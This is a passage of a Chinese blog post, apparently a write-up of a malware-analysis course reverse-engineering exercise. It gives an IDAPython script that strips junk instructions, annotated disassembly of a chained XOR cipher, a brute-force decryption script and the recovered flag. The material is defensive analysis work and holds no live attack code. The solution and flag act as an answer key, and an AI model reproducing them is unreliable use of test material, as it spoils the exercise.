rel=\"noopener\">官方文档</a>对于IDAPython的API有一定程度的讲解，但是这个东西还是有一定的学习成本的，如果感觉上手困难可以看一下Hex-Rays官方每年举办的IDA插件大赛的获奖作品（<a href=\"https://hex-rays.com/contests/\" target=\"_blank\" rel=\"noopener\">链接在这</a>），学习一下。</p>\n<p>这里先直接给出脚本。其实写的很不好，主要思路就是逐指令或逐字节遍历，然后对这几种花指令予以识别和去除。同时由于比较懒，直接设置remove函数执行5次，暴力解决递归问题。不过多执行几次是没有副作用的。</p>\n<p>另外，执行脚本后，可能还会有极少量代码反汇编出错，在分析到相应函数后手工按C识别为代码即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ida_auto <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ida_bytes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ida_ua <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">change = <span class=\"number\">0</span></span><br><span class=\"line\">startea = <span class=\"number\">0x4019e0</span></span><br><span class=\"line\">endea = <span class=\"number\">0x405230</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">preprocess</span><span class=\"params\">(curea = startea)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> curea &lt;= endea:</span><br><span class=\"line\">\t\tauto_make_code(curea)</span><br><span class=\"line\">\t\tcurea = next_head(curea, endea)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">remove</span><span class=\"params\">(curea = startea)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> curea &lt;= endea:</span><br><span class=\"line\">\t\t<span class=\"comment\"># print hex(curea)</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> GetDisasm(curea) == <span class=\"string\">\"retn\"</span>:</span><br><span class=\"line\">\t\t\tMakeCode(curea + <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> GetDisasm(curea).startswith(<span class=\"string\">\"db\"</span>) <span class=\"keyword\">is</span> <span class=\"literal\">True</span> <span class=\"keyword\">and</span> GetDisasm(curea + <span class=\"number\">1</span>).startswith(<span class=\"string\">\"db\"</span>) <span class=\"keyword\">is</span> <span class=\"literal\">False</span> <span class=\"keyword\">and</span> GetDisasm(curea).endswith(<span class=\"string\">\")\"</span>) <span class=\"keyword\">is</span> <span class=\"literal\">False</span>:</span><br><span class=\"line\">\t\t\tdo_unknown(curea + <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\tMakeCode(curea)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> xref <span class=\"keyword\">in</span> XrefsFrom(curea, <span class=\"number\">1</span>):</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># print hex(xref.frm), hex(xref.to)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> xref.to - xref.frm == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> get_byte(xref.frm) == <span class=\"number\">0xeb</span>:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># print \"yes\"</span></span><br><span class=\"line\">\t\t\t\t\tea = xref.frm</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\t\tdo_unknown(ea)</span><br><span class=\"line\">\t\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\t\tea = xref.to</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\tpatch_byte(xref.frm, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">\t\t\t\t\tchange = MakeCode(xref.frm)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">elif</span> xref.to == next_head(curea, endea) + <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> get_byte(xref.to - <span class=\"number\">1</span>) == <span class=\"number\">0xe8</span>:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># print \"yess\"</span></span><br><span class=\"line\">\t\t\t\t\tdo_unknown(xref.to - <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t\t\tea = xref.to</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\t\tpatch_byte(xref.to - <span class=\"number\">1</span>, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">\t\t\t\t\tMakeCode(xref.to - <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">elif</span> xref.to == next_head(next_head(curea, endea), endea) + <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t\ttar_ea = next_head(next_head(curea, endea), endea)</span><br><span class=\"line\">\t\t\t\tea = tar_ea</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\tdo_unknown(ea)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\tea = xref.to</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>):</span><br><span class=\"line\">\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\tea = tar_ea</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">\t\t\t\t\tpatch_byte(ea, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\tea = tar_ea</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">\t\t\t\t\tMakeCode(ea)</span><br><span class=\"line\">\t\t\t\t\tea += <span class=\"number\">1</span></span><br><span class=\"line\">\t\tcurea = next_head(curea, endea)</span><br><span class=\"line\">\tAnalyseRange(startea,endea)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">recognize</span><span class=\"params\">(curea = startea)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> curea &lt;= endea:</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> GetDisasm(curea) == <span class=\"string\">\"push    ebp\"</span> <span class=\"keyword\">and</span> GetDisasm(curea+<span class=\"number\">1</span>) == <span class=\"string\">\"mov     ebp, esp\"</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">print</span> <span class=\"string\">\"should be make\"</span></span><br><span class=\"line\">\t\t\tauto_make_proc(curea)</span><br><span class=\"line\">\t\tcurea = next_head(curea, endea)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">\tpreprocess()</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tremove()</span><br><span class=\"line\">\trecognize()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x03-加密算法分析与逆向\"><a href=\"#0x03-加密算法分析与逆向\" class=\"headerlink\" title=\"0x03  加密算法分析与逆向\"></a>0x03  加密算法分析与逆向</h2><p>至此，我们已经解决了花指令问题，可以开始分析具体算法了。main函数中会调用encrypt函数加密，最后调用hexencode函数输出结果。</p>\n<p>直接查看encrypt函数的F5代码，但是由于是C++程序，伪C代码比较乱，看不出所以然。不过我们可以明确encrypt函数中首先调用了enc2函数。其核心代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ABF                 call    j_?length@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length(void)</span><br><span class=\"line\">.text:00401AC4                 cmp     [ebp-30h], eax  ; cnt &lt; 源字符串长度时</span><br><span class=\"line\">.text:00401AC7                 jnb     short loc_401B18</span><br><span class=\"line\">.text:00401AC9                 push    eax             ; 先push eax</span><br><span class=\"line\">.text:00401ACA                 xor     eax, eax        ; 花指令</span><br><span class=\"line\">.text:00401ACC                 jz      loc_401AD3      ; pop eax，恢复</span><br><span class=\"line\">.text:00401AD2                 nop</span><br><span class=\"line\">.text:00401AD3</span><br><span class=\"line\">.text:00401AD3 loc_401AD3:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD3                 pop     eax             ; pop eax，恢复</span><br><span class=\"line\">.text:00401AD4                 mov     eax, [ebp-30h]  ; eax = cnt</span><br><span class=\"line\">.text:00401AD7                 push    eax</span><br><span class=\"line\">.text:00401AD8                 lea     ecx, [ebp+0Ch]</span><br><span class=\"line\">.text:00401ADB                 call    j_??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z ; 取源字符串中下标cnt处字符</span><br><span class=\"line\">.text:00401AE0                 movsx   ebx, byte ptr [eax] ; 放到ebx中</span><br><span class=\"line\">.text:00401AE3                 lea     ecx, [ebp-1Ch]</span><br><span class=\"line\">.text:00401AE6                 call    j_?length@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length(void)</span><br><span class=\"line\">.text:00401AEB                 mov     ecx, eax        ; 取字符串&quot;2&quot;的长度放到ecx中</span><br><span class=\"line\">.text:00401AED                 mov     eax, [ebp-30h]  ; eax = cnt</span><br><span class=\"line\">.text:00401AF0                 xor     edx, edx        ; 高位置0</span><br><span class=\"line\">.text:00401AF2                 div     ecx             ; cnt / &quot;2&quot;的长度</span><br><span class=\"line\">.text:00401AF4                 push    edx             ; 余数压栈</span><br><span class=\"line\">.text:00401AF5                 lea     ecx, [ebp-1Ch]</span><br><span class=\"line\">.text:00401AF8                 call    j_??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z ; 取key[cnt%len(cip)]</span><br><span class=\"line\">.text:00401AFD                 movsx   edx, byte ptr [eax] ; 放在edx中</span><br><span class=\"line\">.text:00401B00                 xor     ebx, edx        ; ord[cnt] ^ key[cnt%len(cip)]</span><br><span class=\"line\">.text:00401B02                 movsx   eax, byte ptr [ebp+1Ch]</span><br><span class=\"line\">.text:00401B06                 xor     ebx, eax\t\t   ; 再次与输入的密钥字符异或</span><br><span class=\"line\">.text:00401B08                 mov     ecx, [ebp-30h]</span><br><span class=\"line\">.text:00401B0B                 push    ecx</span><br><span class=\"line\">.text:00401B0C                 lea     ecx, [ebp-2Ch]</span><br><span class=\"line\">.text:00401B0F                 call    j_??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z ; std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](uint)</span><br><span class=\"line\">.text:00401B14                 mov     [eax], bl</span><br></pre></td></tr></table></figure>\n<p>这里0x401aeb处的操作比较有趣，这个字符串为什么是2呢？猜想到可能与函数名enc2的2有关，于是用OD调试enc3、enc5函数，发现这个串变成”3”和”5”，这说明果然与函数名有关。</p>\n<p>调用enc2并在两次按位异或后，将结果存储并回到encrpyt函数体调用enc3，然后通过异常处理链调用enc5、enc8……，最后调用enc28657，最后得到加密结果。因此，加密算法的逻辑已经很清楚了，给出Python实现</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span><span class=\"params\">(key)</span>:</span></span><br><span class=\"line\">\tres = <span class=\"string\">\"thisisasimplesamplestring\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> [<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">21</span>,<span class=\"number\">34</span>,<span class=\"number\">55</span>,<span class=\"number\">89</span>,<span class=\"number\">144</span>,<span class=\"number\">233</span>,<span class=\"number\">377</span>,<span class=\"number\">610</span>,<span class=\"number\">987</span>,<span class=\"number\">1597</span>,<span class=\"number\">2584</span>,<span class=\"number\">4181</span>,<span class=\"number\">6765</span>,<span class=\"number\">10946</span>,<span class=\"number\">17711</span>,<span class=\"number\">28657</span>]:</span><br><span class=\"line\">\t\tnum = list(str(n))</span><br><span class=\"line\">\t\ttmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i,b <span class=\"keyword\">in</span> enumerate(res):</span><br><span class=\"line\">\t\t\ttmp += chr((((ord(b) ^ ord(num[i % len(num)]) &amp; <span class=\"number\">0xff</span>) ^ key) &amp; <span class=\"number\">0xff</span>))</span><br><span class=\"line\">\t\tres = tmp</span><br><span class=\"line\">\tflag = res</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> flag</span><br></pre></td></tr></table></figure>\n<p>为了求解flag，需要求解这个算法的逆算法。因为都是按位异或，很容易得到逆算法，并爆破所有可见字符即可catch flag。</p>\n<p>最终脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(key)</span>:</span></span><br><span class=\"line\">\tencrypted = <span class=\"string\">\"\\x3A\\x3B\\x31\\x38\\x23\\x3B\\x3C\\x34\\x37\\x30\\x0B\\x37\\x30\\x07\\x32\\x28\\x39\\x35\\x23\\x06\\x2E\\x2B\\x24\\x2A\"</span>[::<span class=\"number\">-1</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> [<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">21</span>,<span class=\"number\">34</span>,<span class=\"number\">55</span>,<span class=\"number\">89</span>,<span class=\"number\">144</span>,<span class=\"number\">233</span>,<span class=\"number\">377</span>,<span class=\"number\">610</span>,<span class=\"number\">987</span>,<span class=\"number\">1597</span>,<span class=\"number\">2584</span>,<span class=\"number\">4181</span>,<span class=\"number\">6765</span>,<span class=\"number\">10946</span>,<span class=\"number\">17711</span>,<span class=\"number\">28657</span>][::<span class=\"number\">-1</span>]:</span><br><span class=\"line\">\t\t<span class=\"comment\"># print n</span></span><br><span class=\"line\">\t\tnum = list(str(n))</span><br><span class=\"line\">\t\ttmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i,b <span class=\"keyword\">in</span> enumerate(encrypted):</span><br><span class=\"line\">\t\t\ti = len(encrypted) - i - <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\"># print i</span></span><br><span class=\"line\">\t\t\ttmp += chr((((ord(b) ^ key &amp; <span class=\"number\">0xff</span>) ^ ord(num[(i % len(num))])) &amp; <span class=\"number\">0xff</span>))</span><br><span class=\"line\">\t\tencrypted = tmp</span><br><span class=\"line\">\tflag = encrypted</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> flag</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>, <span class=\"number\">126</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">print</span> chr(i)</span><br><span class=\"line\">\t\tres = decrypt(i)</span><br><span class=\"line\">\t\t<span class=\"keyword\">print</span> res[::<span class=\"number\">-1</span>]</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a</span><br><span class=\"line\">flag&#123;ocean_of_junks_zzz&#125;</span><br></pre></td></tr></table></figure>\n","text":"​    这学期《恶意代码分析》这门课的作业留了一道RE题，其中包含大量批量插入的花指令。在这里简单记录一下分析过程。0x00  基本分析首先动态执行程序看一下1<br>2<br>3<br>4<br>5<br>6<br>D:\\UCAS\\malware_analyse&gt;Ant","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"RE","slug":"RE","count":2,"path":"api/tags/RE.json"}]}]}